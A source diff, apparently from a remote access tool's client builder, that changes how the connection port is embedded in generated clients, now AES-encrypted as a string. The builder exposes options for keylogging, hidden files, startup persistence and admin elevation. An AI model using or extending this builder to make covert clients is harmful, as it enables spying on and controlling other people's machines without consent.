@@ -37,7 +37,7 @@ namespace xServer.Core.Build
         /// <exception cref="System.ArgumentException">Thrown if an invalid special folder was specified.</exception>
         /// <exception cref="System.IO.FileLoadException">Thrown if the client binaries do not exist.</exception>
         public static void Build(string output, string host, string password, string installsub, string installname,
-            string mutex, string startupkey, bool install, bool startup, bool hidefile, bool keylogger, int port,
+            string mutex, string startupkey, bool install, bool startup, bool hidefile, bool keylogger, string port,
             int reconnectdelay,
             int installpath, bool adminelevation, string iconpath, string[] asminfo, string version)
         {
@@ -93,6 +93,9 @@ namespace xServer.Core.Build
                                         case 8: //random encryption key
                                             methodDef.Body.Instructions[i].Operand = encKey;
                                             break;
+                                        case 9: //port
+                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(port, encKey);
+                                            break;
                                     }
                                     strings++;
                                 }
@@ -124,10 +127,7 @@ namespace xServer.Core.Build
                                 {
                                     switch (ints)
                                     {
-                                        case 1: //port
-                                            methodDef.Body.Instructions[i].Operand = port;
-                                            break;
-                                        case 2: //reconnectdelay
+                                        case 1: //reconnectdelay
                                             methodDef.Body.Instructions[i].Operand = reconnectdelay;
                                             break;
                                     }
